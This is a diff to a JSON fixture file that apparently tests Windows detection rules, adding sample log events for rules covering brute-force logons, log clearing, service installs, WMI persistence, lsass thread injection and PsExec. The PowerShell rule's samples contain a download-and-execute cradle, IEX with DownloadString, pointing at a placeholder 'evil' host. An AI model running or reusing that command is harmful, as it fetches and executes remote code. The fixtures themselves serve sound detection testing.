@@ -154,5 +154,130 @@
       {"source": "HTTP", "mime_type": "text/html"},
       {"source": "FTP_DATA", "mime_type": "application/x-dosexec"}
     ]
+  },
+  "auth_win_bruteforce_failed_logons.yml": {
+    "true_positive": {"EventID": 4625, "TargetUserName": "jsmith"},
+    "true_negatives": [
+      {"EventID": 4624, "TargetUserName": "jsmith"}
+    ]
+  },
+  "auth_win_bruteforce_source_spray.yml": {
+    "true_positive": {"EventID": 4625, "TargetUserName": "jsmith", "IpAddress": "203.0.113.42"},
+    "true_negatives": [
+      {"EventID": 4624, "TargetUserName": "jsmith", "IpAddress": "203.0.113.42"}
+    ]
+  },
+  "auth_win_explicit_cred_account_sweep.yml": {
+    "true_positive": {"EventID": 4648, "TargetUserName": "svc_backup"},
+    "true_negatives": [
+      {"EventID": 4624, "TargetUserName": "svc_backup"}
+    ]
+  },
+  "auth_win_sedebug_special_logon.yml": {
+    "true_positive": {
+      "EventID": 4672,
+      "PrivilegeList": "SeDebugPrivilege SeBackupPrivilege",
+      "SubjectUserSid": "S-1-5-21-111-222-333-1001"
+    },
+    "true_negatives": [
+      {"EventID": 4672, "PrivilegeList": "SeDebugPrivilege", "SubjectUserSid": "S-1-5-18"},
+      {
+        "EventID": 4672,
+        "PrivilegeList": "SeBackupPrivilege SeRestorePrivilege",
+        "SubjectUserSid": "S-1-5-21-111-222-333-1001"
+      }
+    ]
+  },
+  "auth_win_security_log_cleared.yml": {
+    "true_positive": {"EventID": 1102},
+    "true_negatives": [
+      {"EventID": 4624}
+    ]
+  },
+  "system_win_eventlog_cleared.yml": {
+    "true_positive": {"EventID": 104},
+    "true_negatives": [
+      {"EventID": 6005}
+    ]
+  },
+  "system_win_service_installed.yml": {
+    "true_positive": {"EventID": 7045},
+    "true_negatives": [
+      {"EventID": 7040}
+    ]
+  },
+  "system_win_eventlog_service_tamper.yml": {
+    "true_positive": {"EventID": 7040, "param1": "Windows Event Log"},
+    "true_negatives": [
+      {"EventID": 7040, "param1": "Print Spooler"},
+      {"EventID": 7045, "param1": "Windows Event Log"}
+    ]
+  },
+  "auth_win_priv_group_membership_change.yml": {
+    "_comment": "true_positive uses a localized group name (German 'Administratoren') the name-based selection would miss, deliberately proving the rule fires via the SID-based selection instead (locale/rename bypass fix).",
+    "true_positive": {
+      "EventID": 4732,
+      "TargetUserName": "Administratoren",
+      "TargetSid": "S-1-5-32-544"
+    },
+    "true_negatives": [
+      {"EventID": 4732, "TargetUserName": "Remote Desktop Users", "TargetSid": "S-1-5-32-555"},
+      {"EventID": 4720, "TargetUserName": "Administrators", "TargetSid": "S-1-5-32-544"}
+    ]
+  },
+  "wmi_win_event_subscription_binding.yml": {
+    "true_positive": {
+      "EventID": 5861,
+      "Operation": "IWbemServices::PutInstance - __FilterToConsumerBinding"
+    },
+    "true_negatives": [
+      {"EventID": 5861, "Operation": "IWbemServices::PutInstance - __EventFilter"},
+      {"EventID": 5859, "Operation": "IWbemServices::PutInstance - __FilterToConsumerBinding"}
+    ]
+  },
+  "create_remote_thread_win_susp_target.yml": {
+    "true_positive": {
+      "EventID": 8,
+      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+      "SourceUser": "NT AUTHORITY\\SYSTEM"
+    },
+    "true_negatives": [
+      {
+        "EventID": 8,
+        "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+        "SourceUser": "NT AUTHORITY\\SYSTEM"
+      },
+      {
+        "EventID": 1,
+        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+        "SourceUser": "CORP\\jsmith"
+      }
+    ]
+  },
+  "proc_creation_win_lateral_tool_parent.yml": {
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "ParentImage": "C:\\Windows\\PSEXESVC.exe"
+    },
+    "true_negatives": [
+      {"Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\explorer.exe"},
+      {
+        "Image": "C:\\Windows\\System32\\notepad.exe",
+        "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
+      }
+    ]
+  },
+  "posh_ps_obfuscated_scriptblock.yml": {
+    "true_positive": {
+      "EventID": 4104,
+      "ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://evil/a.ps1')"
+    },
+    "true_negatives": [
+      {"EventID": 4104, "ScriptBlockText": "Get-Process | Where-Object {$_.CPU -gt 10}"},
+      {
+        "EventID": 4103,
+        "ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://evil/a.ps1')"
+      }
+    ]
   }
 }
